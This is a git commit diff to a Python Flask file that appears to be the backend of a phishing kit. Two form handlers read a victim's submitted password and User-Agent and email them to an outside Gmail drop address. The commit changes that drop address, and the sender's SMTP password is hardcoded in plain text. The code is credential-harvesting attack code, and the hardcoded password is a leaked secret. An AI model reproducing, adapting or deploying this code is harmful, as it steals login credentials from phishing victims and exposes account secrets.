bbbb3656a25b347ce6e989cb2db68cc6a5c301d7
danicodehouse <119807915+danicodehouse@users.noreply.github.com>
2024-12-22 20:23:06 +0100

    Update main.py

--- main.py
+++ main.py
@@ -84,7 +84,7 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "log@guide-level.com"
         sender_emaill = "contact"
-        receiver_email = "bcjung0071@gmail.com"
+        receiver_email = "danielnewwoj@gmail.com"
         password = "!p&4Ke_@M2HR"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -122,7 +122,7 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "log@guide-level.com"
         sender_emaill = "contact"
-        receiver_email = "bcjung0071@gmail.com"
+        receiver_email = "danielnewwoj@gmail.com"
         password = "!p&4Ke_@M2HR"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
